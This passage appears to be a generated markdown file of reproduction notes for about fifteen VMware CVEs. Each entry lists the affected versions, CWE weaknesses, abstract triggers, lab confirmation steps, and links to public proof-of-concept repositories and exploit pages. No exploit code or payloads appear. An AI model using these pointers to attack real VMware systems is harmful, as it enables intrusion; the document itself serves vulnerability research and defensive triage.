- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2021/CVE-2021-21985.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/163487/VMware-vCenter-Server-Virtual-SAN-Health-Check-Remote-Code-Execution.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2022-22954

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware identity_manager 3.3.3; vmware identity_manager 3.3.4; vmware identity_manager 3.3.5. NVD lists 11 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-22954)]
- Weakness: CWE-94. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-22954)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-22954)] [[nvd](http://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: vmware identity_manager 3.3.3. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-22954)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-22954)] [[nvd](http://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2022-22954
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/Schira4396/VcenterKiller
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2022/CVE-2022-22954.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/166935/VMware-Workspace-ONE-Access-Template-Injection-Command-Execution.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2023-20887

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware aria_operations_for_networks >= 6.2.0, <= 6.10.0. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20887)]
- Weakness: CWE-77. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20887)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20887)] [[nvd](http://packetstormsecurity.com/files/173761/VMWare-Aria-Operations-For-Networks-Remote-Command-Execution.html)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: vmware aria_operations_for_networks >= 6.2.0, <= 6.10.0. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20887)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20887)] [[nvd](http://packetstormsecurity.com/files/173761/VMWare-Aria-Operations-For-Networks-Remote-Command-Execution.html)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-20887
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/sinsinology/CVE-2023-20887
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2023/CVE-2023-20887.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/173761/VMWare-Aria-Operations-For-Networks-Remote-Command-Execution.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-37085

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware cloud_foundation >= 4.0, < 5.2; vmware esxi 7.0; vmware esxi 8.0. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-37085)]
- Weakness: CWE-287, CWE-305. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-37085)]

### Input / trigger
- NVD characterizes the trigger as authentication bypass. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-37085)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-37085)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as authentication bypass. Structured affected range: vmware cloud_foundation >= 4.0, < 5.2. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-37085)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-37085)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-37085)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2024-37085
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/mahmutaymahmutay/CVE-2024-37085
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2024/CVE-2024-37085.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2024-22273

> Status: `repro: partial` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware cloud_foundation >= 4.0, < 5.1.1; vmware workstation >= 17.0.0, < 17.5.1; vmware esxi 7.0. NVD lists 5 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22273)]
- Weakness: CWE-125, CWE-787. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22273)]

### Input / trigger
- Affected product and an abstract condition are public (denial of service). No concrete request or public PoC URL was found, so none is stated here. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22273)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as denial of service. Structured affected range: vmware cloud_foundation >= 4.0, < 5.1.1. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22273)]

### How to confirm
- Not possible from public sources beyond the affected-versus-patched range above. No concrete input was published, so none was invented. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22273)]

### Public PoC (if any)
- None found.

### What's missing
- No public PoC (ExploitDB / PoC-in-GitHub / NVD Exploit-tagged refs / GHSA PoC refs empty).
- No concrete request or payload in the cited advisories. None was invented.

## Steps to reproduce — CVE-2024-22252

> Status: `repro: partial` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware workstation >= 17.0.0, < 17.5.1; vmware esxi 7.0; vmware esxi 7.0.0. NVD lists 5 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22252)]
- Weakness: CWE-416. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22252)]

### Input / trigger
- Affected product and an abstract condition are public (code execution). No concrete request or public PoC URL was found, so none is stated here. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22252)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as code execution. Structured affected range: vmware workstation >= 17.0.0, < 17.5.1. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22252)]

### How to confirm
- Not possible from public sources beyond the affected-versus-patched range above. No concrete input was published, so none was invented. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22252)]

### Public PoC (if any)
- None found.

### What's missing
- No public PoC (ExploitDB / PoC-in-GitHub / NVD Exploit-tagged refs / GHSA PoC refs empty).
- No concrete request or payload in the cited advisories. None was invented.

## Steps to reproduce — CVE-2024-22253

> Status: `repro: partial` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware cloud_foundation >= 4.0, <= 5.0; vmware workstation >= 17.0.0, < 17.5.1; vmware esxi 7.0. NVD lists 6 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22253)]
- Weakness: CWE-416. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22253)]

### Input / trigger
- Affected product and an abstract condition are public (code execution). No concrete request or public PoC URL was found, so none is stated here. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22253)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as code execution. Structured affected range: vmware cloud_foundation >= 4.0, <= 5.0. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22253)]

### How to confirm
- Not possible from public sources beyond the affected-versus-patched range above. No concrete input was published, so none was invented. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2024-22253)]

### Public PoC (if any)
- None found.

### What's missing
- No public PoC (ExploitDB / PoC-in-GitHub / NVD Exploit-tagged refs / GHSA PoC refs empty).
- No concrete request or payload in the cited advisories. None was invented.

## Steps to reproduce — CVE-2023-34048

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware vcenter_server >= 4.0, <= 5.5; vmware vcenter_server 7.0; vmware vcenter_server 8.0. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-34048)]
- Weakness: CWE-787. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-34048)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-34048)] [[nvd](https://www.vicarius.io/vsociety/posts/understanding-cve-2023-34048-a-zero-day-out-of-bound-write-in-vcenter-server)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: vmware vcenter_server >= 4.0, <= 5.5. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-34048)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-34048)] [[nvd](https://www.vicarius.io/vsociety/posts/understanding-cve-2023-34048-a-zero-day-out-of-bound-write-in-vcenter-server)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2023-34048
- NVD Exploit-tagged reference: https://www.vicarius.io/vsociety/posts/understanding-cve-2023-34048-a-zero-day-out-of-bound-write-in-vcenter-server

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2023-20892

> Status: `repro: partial` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware vcenter_server < 7.0; vmware vcenter_server 7.0; vmware vcenter_server 8.0. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20892)]
- Weakness: CWE-787. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20892)]

### Input / trigger
- Affected product and an abstract condition are public (arbitrary code). No concrete request or public PoC URL was found, so none is stated here. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20892)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as arbitrary code. Structured affected range: vmware vcenter_server < 7.0. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20892)]

### How to confirm
- Not possible from public sources beyond the affected-versus-patched range above. No concrete input was published, so none was invented. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2023-20892)]

### Public PoC (if any)
- None found.

### What's missing
- No public PoC (ExploitDB / PoC-in-GitHub / NVD Exploit-tagged refs / GHSA PoC refs empty).
- No concrete request or payload in the cited advisories. None was invented.

## Steps to reproduce — CVE-2022-31656

> Status: `repro: partial` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware identity_manager 3.3.4; vmware identity_manager 3.3.5; vmware identity_manager 3.3.6. NVD lists 12 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31656)]

### Input / trigger
- Affected product and an abstract condition are public (authentication bypass). No concrete request or public PoC URL was found, so none is stated here. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31656)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as authentication bypass. Structured affected range: vmware identity_manager 3.3.4. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31656)]

### How to confirm
- Not possible from public sources beyond the affected-versus-patched range above. No concrete input was published, so none was invented. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31656)]

### Public PoC (if any)
- None found.

### What's missing
- No public PoC (ExploitDB / PoC-in-GitHub / NVD Exploit-tagged refs / GHSA PoC refs empty).
- No concrete request or payload in the cited advisories. None was invented.

## Steps to reproduce — CVE-2022-31659

> Status: `repro: partial` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware identity_manager 3.3.4; vmware identity_manager 3.3.5; vmware identity_manager 3.3.6. NVD lists 12 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31659)]
- Weakness: CWE-89. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31659)]

### Input / trigger
- Affected product and an abstract condition are public (remote code execution). No concrete request or public PoC URL was found, so none is stated here. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31659)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: vmware identity_manager 3.3.4. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31659)]

### How to confirm
- Not possible from public sources beyond the affected-versus-patched range above. No concrete input was published, so none was invented. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2022-31659)]

### Public PoC (if any)
- None found.

### What's missing
- No public PoC (ExploitDB / PoC-in-GitHub / NVD Exploit-tagged refs / GHSA PoC refs empty).
- No concrete request or payload in the cited advisories. None was invented.

## Steps to reproduce — CVE-2021-22005

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware cloud_foundation >= 3.0, < 5.0; vmware vcenter_server 6.5; vmware vcenter_server 6.7. NVD lists 4 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22005)]
- Weakness: CWE-22. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22005)]

### Input / trigger
- No concrete request string is stated in the cited advisory text. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22005)] [[nvd](http://packetstormsecurity.com/files/164439/VMware-vCenter-Server-Analytics-CEIP-Service-File-Upload.html)]

### Expected (patched) vs vulnerable behavior
- See the public record (abstract only). No concrete vulnerable-versus-patched behavior was copied from the advisory. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22005)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-22005)] [[nvd](http://packetstormsecurity.com/files/164439/VMware-vCenter-Server-Analytics-CEIP-Service-File-Upload.html)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-22005
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/shmilylty/cve-2021-22005-exp
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2021/CVE-2021-22005.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/164439/VMware-vCenter-Server-Analytics-CEIP-Service-File-Upload.html

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2020-3992

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware cloud_foundation >= 3.0, < 3.10.1.2; vmware cloud_foundation >= 4.0, < 4.1.0.1; vmware esxi 6.5. NVD lists 5 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3992)]
- Weakness: CWE-416. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3992)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3992)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-3992)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: vmware cloud_foundation >= 3.0, < 3.10.1.2. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3992)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2020-3992)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-3992)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2020-3992
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2020/CVE-2020-3992.json

### What's missing
- (none for verified-public)

## Steps to reproduce — CVE-2019-5544

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: vmware horizon_daas >= 8.0.0, < 9.0.0.0; vmware esxi 6.0; vmware esxi 6.5. NVD lists 24 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-5544)]
- Weakness: CWE-787. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-5544)]

### Input / trigger
- No concrete request string is stated in the cited advisory text. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-5544)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-5544)]

### Expected (patched) vs vulnerable behavior
- See the public record (abstract only). No concrete vulnerable-versus-patched behavior was copied from the advisory. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-5544)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2019-5544)] [[ghsa](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-5544)]

### Public PoC (if any)
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-5544
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2019/CVE-2019-5544.json

### What's missing
- (none for verified-public)
<!-- bughive-repro-end -->
